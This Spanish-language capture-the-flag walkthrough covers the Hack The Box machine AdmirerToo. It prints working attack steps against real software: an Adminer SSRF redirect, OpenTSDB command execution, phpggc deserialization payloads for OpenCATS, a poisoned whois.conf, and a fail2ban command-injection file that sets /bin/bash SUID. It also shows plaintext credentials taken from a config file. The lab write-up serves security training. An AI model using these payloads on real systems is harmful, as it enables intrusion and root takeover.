---
title: AdmirerToo
date: 2023-03-13 13:25:30 +/-TTTT
categories: [HTB MACHINES, Linux]
tags: []     # TAG names should always be lowercase
---

```shell
# Nmap 7.92 scan initiated Mon Mar 13 13:44:45 2023 as: nmap -sCV -p22,80 -oN targeted 10.10.11.137
Nmap scan report for 10.10.11.137
Host is up (0.15s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 99:33:47:e6:5f:1f:2e:fd:45:a4:ee:6b:78:fb:c0:e4 (RSA)
|   256 4b:28:53:64:92:57:84:77:5f:8d:bf:af:d5:22:e1:10 (ECDSA)
|_  256 71:ee:8e:e5:98:ab:08:43:3b:86:29:57:23:26:e9:10 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Admirer
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Mar 13 13:44:59 2023 -- 1 IP address (1 host up) scanned in 13.80 seconds
```
En primeras nos comparten una página web donde nos comparten imagenes que podemos visualizar y eso es todo, procedemos a fuzzear por directorios existenes.

![imagen1](/assets/images/AdmirerTwo/admirer1.png)

```shell
❯ wfuzz -c --hc=404 -w /usr/share/Seclists/Discovery/Web-Content/common.txt 'http://10.10.11.137/FUZZ'
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.11.137/FUZZ
Total requests: 4712

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                     
=====================================================================

000000025:   403        9 L      29 W       328 Ch      ".htpasswd"                                                                                                                                 
000000024:   403        9 L      29 W       328 Ch      ".htaccess"                                                                                                                                 
000000023:   403        9 L      29 W       328 Ch      ".hta"                                                                                                                                      
000001325:   301        9 L      29 W       361 Ch      "css"                                                                                                                                       
000001829:   301        9 L      29 W       363 Ch      "fonts"                                                                                                                                     
000002170:   301        9 L      29 W       361 Ch      "img"                                                                                                                                       
000002192:   200        268 L    658 W      14099 Ch    "index.php"                                                                                                                                 
000002348:   301        9 L      29 W       360 Ch      "js"                                                                                                                                        
000002596:   301        9 L      29 W       364 Ch      "manual"                                                                                                                                    

Total time: 0
Processed Requests: 4712
Filtered Requests: 4703
Requests/sec.: 0
```
Encontramos una ruta manual que al ingresarla nos hace una especie de redirect hacia el manual de apache2, al momento de interceptar esta petición hacia manual antes de hacer un redirect pudimos obtener un dominio.

![imagen2](/assets/images/AdmirerTwo/admirer2.png)

Intentamos fuzzear por nuevos subdominios y encontramos a db con gobuster.

```shell
❯ gobuster vhost -w /usr/share/Seclists/Discovery/DNS/subdomains-top1million-5000.txt -u "http://admirer-gallery.htb"
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://admirer-gallery.htb
[+] Method:       GET
[+] Threads:      10
[+] Wordlist:     /usr/share/Seclists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2023/03/13 13:59:57 Starting gobuster in VHOST enumeration mode
===============================================================
Found: db.admirer-gallery.htb (Status: 200) [Size: 2569]
                                                        
===============================================================
2023/03/13 14:00:44 Finished
===============================================================
```
Dentro el subdomino nos encotramos con adminer que es una herramienta para administrar contenido en bases de datos. Es compatible de forma nativa con MySQL, MariaDB, PostgreSQL, SQLite, MS SQL, Oracle, Elasticsearch y MongoDB. Adminer se distribuye bajo licencia Apache en forma de un único archivo PHP.

![imagen2](/assets/images/AdmirerTwo/admirer3.png)

Dentro nos encontramos con la base de datos de las imágenes que se mostraron en el inicio.

![imagen3](/assets/images/AdmirerTwo/admirer4.png)

Fuzzeando sobre este subdominio encontramos un directorio plugins, dentro encontramos tres archivos pero no podemos visualizar el contenido, entonces no nos será útil por el momento. Intentamos buscar vulenrabilidades sobre adminer 4.7.8. Indagando nos encontramos con este [Link](https://github.com/vrana/adminer/security/advisories/GHSA-x5r2-hj5c-8jx6 "post") que menciona SSRF en el apartado del login de esta plataforma. Menciona sobre la vulnerabilidad sobre elasticsearch y mediante este [Link](https://gist.github.com/bpsizemore/227141941c5075d96a34e375c63ae3bd "script) poder reedireccionar la petición a algún contenido local de la máquina víctima. Primero con burpsuite interceptamos la petición del login, ya que en este no nos muestra todo los campos disponibles, esto nos ayudará a interceptar con burpsuite y cambiar los parámetros.

![imagen4](/assets/images/AdmirerTwo/admirer4.png)

![imagen5](/assets/images/AdmirerTwo/admirer5.png)

Cambiamos el campo de driver por elastic y el campo service por nuestra ip para ver si con nc nos arroja alguna conexión.

```shell
❯ sudo nc -lnvp 80
listening on [any] 80 ...
connect to [10.10.14.22] from (UNKNOWN) [10.10.11.137] 47934
GET / HTTP/1.0
Authorization: Basic YWRtaXJlcl9ybzo=
Host: 10.10.14.22
Connection: close
Content-Length: 2
Content-Type: application/json
```
En este punto tenemos un SSRF exitoso pero en este punto no nos podría servir de mucho a menos que tuvieron algún puerto donde no podamos visualizar externamente. Hacemos un escaneo con nmap para revisar puerto filtrados.

```shell
❯ sudo nmap -p- -sS --min-rate 5000 -n -vvv -Pn  10.10.11.137 -oG grep
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2023-03-13 17:50 CST
Initiating SYN Stealth Scan at 17:50
Scanning 10.10.11.137 [65535 ports]
Discovered open port 80/tcp on 10.10.11.137
Discovered open port 22/tcp on 10.10.11.137
Completed SYN Stealth Scan at 17:50, 13.32s elapsed (65535 total ports)
Nmap scan report for 10.10.11.137
Host is up, received user-set (0.089s latency).
Scanned at 2023-03-13 17:50:21 CST for 13s
Not shown: 65530 closed tcp ports (reset)
PORT      STATE    SERVICE        REASON
22/tcp    open     ssh            syn-ack ttl 63
80/tcp    open     http           syn-ack ttl 63
4242/tcp  filtered vrml-multi-use port-unreach ttl 63
16010/tcp filtered unknown        no-response
16030/tcp filtered unknown        no-response

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 13.50 seconds
           Raw packets sent: 66092 (2.908MB) | Rcvd: 65883 (2.635MB)
```
Nos encontramos con el puerto 4242 filtrado, podremos revisar el contenido del puerto haciendo un redirect al localhost por el puerto 4242 de la máquina víctima.

```shell
❯ sudo python2 redirect.py -p 80 http://localhost:4242
serving at port 80
10.10.11.137 - - [13/Mar/2023 17:56:06] "GET / HTTP/1.0" 301 -
10.10.11.137 - - [13/Mar/2023 17:56:08] "GET / HTTP/1.0" 301 -
```
Desde la página web podemos encontramos el resultado de la petición.

![imagen6](/assets/images/AdmirerTwo/admirer6.png)

En esta podemos ver que opentsdb está implentado en ese puerto. opentsdb se define como una Base de Datos de Series Temporales y en su versión 2.4.0 hay un RCE, en la respuesta no nos mencionan la versión pero podemos ponerlo a prueba para ver si funciona. Dentro de este [Link](https://github.com/OpenTSDB/opentsdb/issues/2051 "post") indica la url donde existe la vulnerabilidad. Intentamos mandar el redirect a esa ruta y hacemos que nos envíe un ping para ver que pasa. 

![imagen7](/assets/images/AdmirerTwo/admirer7.png)

```console
org.jboss.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:559) [netty-3.10.6.Final.jar:na]\n\tat org.hbase.async.HBaseClient$RegionClientPipeline.sendUpstream(HBaseClient.java:3857) ~[asynchbase-1.8.2.jar:na]\n\t... 12 common frames omitted\nCaused by: net.opentsdb.uid.NoSuchUniqueName: No such name for 'metrics': 'sys.cpu.nice'\n\tat net.opentsdb.uid.UniqueId$1GetIdCB.call(UniqueId.java:450) ~[tsdb-2.4.0.jar:14ab3ef]\n\tat net.opentsdb.uid.UniqueId$1GetIdCB.call(UniqueId.java:447) ~[tsdb-2.4.0.jar:14ab3ef]\n\t... 34 common frames omitted\n"}
```
Vemos que nos marca un error al no existir la métrica sys.cpu.nice, investigando un poco sobre las métricas, hay una manera de listar estas mismas por http mediante esta url `http://ip/api/suggest?type=metrics&q=sys&max=10` procedemos a intentarlo

![imagen8](/assets/images/AdmirerTwo/admirer8.png)

Cambiamos la métrica que nos regresaron por lo que nos estaba causando conflicto y volvermos a intentar el ping.

```shell
❯ sudo tcpdump -i tun0 icmp -n
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
18:28:19.194798 IP 10.10.11.137 > 10.10.14.22: ICMP echo request, id 1755, seq 1, length 64
18:28:19.194802 IP 10.10.14.22 > 10.10.11.137: ICMP echo reply, id 1755, seq 1, length 64
```
Obtuvimos satisfactoriamente el ping, procedemos a entablarnos una conexión con ayuda de curl y bash.

![imagen9](/assets/images/AdmirerTwo/admirer9.png)

Dentro podremos verificar los archivos dentro de la carpeta plugins que no pudimos visualizar. En este encontramos un par de credenciales.

```shell
opentsdb@admirertoo:/var/www/adminer/plugins/data$ cat servers.php
<?php
return [
  'localhost' => array(
//    'username' => 'admirer',
//    'pass'     => 'bQ3u7^AxzcB7qAsxE3',
// Read-only account for testing
    'username' => 'admirer_ro',
    'pass'     => '1w4nn4b3adm1r3d2!',
    'label'    => 'MySQL',
    'databases' => array(
      'admirer' => 'Admirer DB',
    )
  ),
];
```
Revisando el passwd podemos intentar conectarnos con estas credenciales por medio de ssh.

```shell
opentsdb@admirertoo:/var/www/adminer/plugins/data$ cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
jennifer:x:1002:100::/home/jennifer:/bin/bash
```
Con jennifer tuvimos éxito al conectarnos con las nuevas credenciales.

```shell
❯ ssh jennifer@10.10.11.137
The authenticity of host '10.10.11.137 (10.10.11.137)' can't be established.
ECDSA key fingerprint is SHA256:7ES0PDZC7RQ7ZgfcZylBLXpuGI+EgrGEmO04kwjbp54.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.137' (ECDSA) to the list of known hosts.
jennifer@10.10.11.137's password: 
Linux admirertoo 4.19.0-18-amd64 #1 SMP Debian 4.19.208-1 (2021-09-29) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
No mail.
Last login: Tue Feb 22 20:58:38 2022 from 10.10.14.8
jennifer@admirertoo:~$ whoami
jennifer
jennifer@admirertoo:~$ 
```
Dentro vemos que está corriendo el puerto 8080 que no pudimos visualizar.

```shell
jennifer@admirertoo:~$ netstat -nat
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
tcp        0    208 10.10.11.137:22         10.10.14.22:43388       ESTABLISHED
tcp        0      0 10.10.11.137:45972      10.10.14.22:443         ESTABLISHED
tcp6       0      0 :::16030                :::*                    LISTEN     
```
Hacemos un portforwarding para traernos el puerto a nuestra máquina.

```shell
❯ ssh jennifer@10.10.11.137 -L 8081:127.0.0.1:8080
```
Dentro del puerto nos encontramos con opencats, con las credenciales por defecto no pudimos conectarnos, pero con las credenciales de jennifer sí tuvimos éxito.

![imagen10](/assets/images/AdmirerTwo/admirer10.png)

Encontramos que la versión de opencats es la 0.9.5.2, buscando vulnerabilidades para esto encontramos este [Link](https://www.joyk.com/dig/detail/1676299490423142 "post"). Menciona que por deserealización podremos ejecutar comandos desde la plataforma, hacemos una prueba creando un archivo. Con ayuda de [Link](https://github.com/ambionics/phpggc "phpggc") creamos una cadena como nos muestra en el blog, después con burpsuite mandamos la petición con nuestra cadena y dentro de la máquina revisamos si nos creó el archivo prueba.txt.

```shell
❯ ./phpggc -u --fast-destruct Guzzle/FW1 /dev/shm/hg8  hg8
a%3A2%3A%7Bi%3A7%3BO%3A31%3A%22GuzzleHttp%5CCookie%5CFileCookieJar%22%3A4%3A%7Bs%3A41%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00filename%22%3Bs%3A19%3A%22%2Ftmp%2Fprivesc%2Fprueba%22%3Bs%3A52%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00storeSessionCookies%22%3Bb%3A1%3Bs%3A36%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00cookies%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A27%3A%22GuzzleHttp%5CCookie%5CSetCookie%22%3A1%3A%7Bs%3A33%3A%22%00GuzzleHttp%5CCookie%5CSetCookie%00data%22%3Ba%3A3%3A%7Bs%3A7%3A%22Expires%22%3Bi%3A1%3Bs%3A7%3A%22Discard%22%3Bb%3A0%3Bs%3A5%3A%22Value%22%3Bs%3A19%3A%22esto+es+una+prueba%0A%22%3B%7D%7D%7Ds%3A39%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00strictMode%22%3BN%3B%7Di%3A7%3Bi%3A7%3B%7D
```
![imagen11](/assets/images/AdmirerTwo/admirer11.png)

```shell
jennifer@admirertoo:/tmp/privesc$ ls -la /dev/shm
total 4
drwxrwxrwt  2 root  root    60 Mar 14 16:32 .
drwxr-xr-x 16 root  root  3080 Mar 14 00:10 ..
-rw-r--r--  1 devel devel   48 Mar 14 16:32 hg8
```
Podemos ver que funcionó la prueba, se creó el archivo a nombre de devel, en primeras esto no pareciera importante ya que devel no es un usuario privilegiado. Intentamos buscar directorios donde devel tenga permisos de escritura para revisar que podemos hacer.

```shell
jennifer@admirertoo:/$ find \-group devel 2>/dev/null
./opt/opencats/INSTALL_BLOCK
./usr/local/src
./usr/local/etc
```
Tenemos varias carpetas donde tiene permisos de escritura, al enumerar servicios vemos que fail2ban está corriendo.

```shell
jennifer@admirertoo:/$ systemctl list-units | grep running
proc-sys-fs-binfmt_misc.automount                                                                loaded active running   Arbitrary Executable File Formats File System Automount Point     
init.scope                                                                                       loaded active running   System and Service Manager                                        
session-538.scope                                                                                loaded active running   Session 538 of user jennifer                                      
apache2.service                                                                                  loaded active running   The Apache HTTP Server                                            
apache2@opencats.service                                                                         loaded active running   The Apache HTTP Server                                            
cron.service                                                                                     loaded active running   Regular background program processing daemon                      
dbus.service                                                                                     loaded active running   D-Bus System Message Bus                                          
fail2ban.service                                                                                 loaded active running   Fail2Ban Service                                                  
getty@tty1.service                                                                               loaded active running   Getty on tty1                                                     
hbase.service                                                                                    loaded active running   HBase                                                             
mariadb.service                                                                                  loaded active running   MariaDB 10.3.31 database server      
```
Investigando vemos que fail2ban tiene una vulnerabilidad que nos permite ejectuar comandos. En este [Link](https://research.securitum.com/fail2ban-remote-code-execution/ "post") podemos ver de que se trata la vulnerabilidad. Menciona que fail2ban usa whois para recoger información sobre los bloqueos que se ejecutan. Insepeccionando whois vemos que la carpeta donde recoge el archivo de configuración es la misma donde tenemos permisos de escritura con el usuario devel.

```shell
jennifer@admirertoo:/etc/fail2ban$ strace whois
rt_sigaction(SIGALRM, {sa_handler=0x56081187ebd0, sa_mask=[ALRM], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7fe334e31840}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, 8) = 0
openat(AT_FDCWD, "/usr/local/etc/whois.conf", O_RDONLY) = -1 ENOENT (No such file or directory)
fstat(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(0x88, 0), ...}) = 0
write(1, "No whois server is known for thi"..., 50No whois server is known for this kind of object.
) = 50
exit_group(1)                           = ?
+++ exited with 1 +++
jennifer@admirertoo:/etc/fail2ban$ 
```
Entonces lo que podemos hacer es subir un archivo de configuración de whois donde pongamos nuestra ip para que así podamos compartir el archivo con el vulnerabilidad de fail2ban donde nos ejecuta comandos. Primero aseguramos que nos de conexión con el whois

```shell
❯ ./phpggc -u --fast-destruct Guzzle/FW1 /usr/local/etc/whois.conf whois.conf
a%3A2%3A%7Bi%3A7%3BO%3A31%3A%22GuzzleHttp%5CCookie%5CFileCookieJar%22%3A4%3A%7Bs%3A41%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00filename%22%3Bs%3A25%3A%22%2Fusr%2Flocal%2Fetc%2Fwhois.conf%22%3Bs%3A52%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00storeSessionCookies%22%3Bb%3A1%3Bs%3A36%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00cookies%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A27%3A%22GuzzleHttp%5CCookie%5CSetCookie%22%3A1%3A%7Bs%3A33%3A%22%00GuzzleHttp%5CCookie%5CSetCookie%00data%22%3Ba%3A3%3A%7Bs%3A7%3A%22Expires%22%3Bi%3A1%3Bs%3A7%3A%22Discard%22%3Bb%3A0%3Bs%3A5%3A%22Value%22%3Bs%3A24%3A%2210.10.14.22+10.10.14.22%0A%22%3B%7D%7D%7Ds%3A39%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00strictMode%22%3BN%3B%7Di%3A7%3Bi%3A7%3B%7D
```
Aplcamos la vulenrabilidad de opencats y vemos el archivo whois.conf pero encontramos un error al momento usar whois a nuestra máquina.

```shell
jennifer@admirertoo:/usr/local/etc$ cat whois.conf 
[{"Expires":1,"Discard":false,"Value":"10.10.14.22 10.10.14.22\n"}]

jennifer@admirertoo:/usr/local/etc$ whois 10.10.14.22
Invalid regular expression '[{"Expires":1,"Discard":false,"Value":"10.10.14.22': Unmatched [, [^, [:, [., or [=
```
Los corchetes nos dan problemas porque no reconoce la expresión regular que se debe aplicar, podemos usar un corchete para cerrar la expresión antes de nuestra ip y aplica in asterisco para que nos reconozca las ip. El problema después es sobre los caracteres después de las ip. Dentro del repositorio de whois podremos encontrar el código del comando, y podemos ver que cuando trata de leer el archivo de configuración tiene un buffer definido por lo que podemos aplicar más caracteres para que al final no logre detectar el corchete final y el sato de línea.

```c
#ifdef CONFIG_FILE
const char *match_config_file(const char *s)
{
    FILE *fp;
    char buf[512];
    static const char delim[] = " \t";

    if ((fp = fopen(CONFIG_FILE, "r")) == NULL) {
	if (errno != ENOENT)
	    err_sys("Cannot open " CONFIG_FILE);
	return NULL;
    }
```

```shell
❯ python -c 'print("]*10.10.14.6 10.10.14.22" + " "*600)' > whois.conf
❯ /usr/bin/cat whois.conf
]*10.10.14.22 10.10.14.22                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        
```
Con esto podemos volver a intentar utilizar el whois.

![imagen12](/assets/images/AdmirerTwo/admirer12.png)

Con esto verificamos que tenemos conexión, solo faltaría aplicar la vulnerabilidad compartiendo un archivo donde pongamos ~! y algún comando que queramos, en este caso vamos a hacer la bash suid, después de compartido el archivo, tenemos que proceder a usar ssh para que fail2ban nos bloqué y así poderese ejecutar.

```shell
❯ /usr/bin/cat pwned
lo que sea
~! chmod u+s /bin/bash
```
Esperamos un momento a que se nos quite el bloqueo y volvemos a logearnos y habremos conseguido suid a la bash.

```shell
jennifer@admirertoo:/usr/local/etc$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1168776 Apr 18  2019 /bin/bash
jennifer@admirertoo:/usr/local/etc$ bash -p
bash-5.0# whoami
root
```
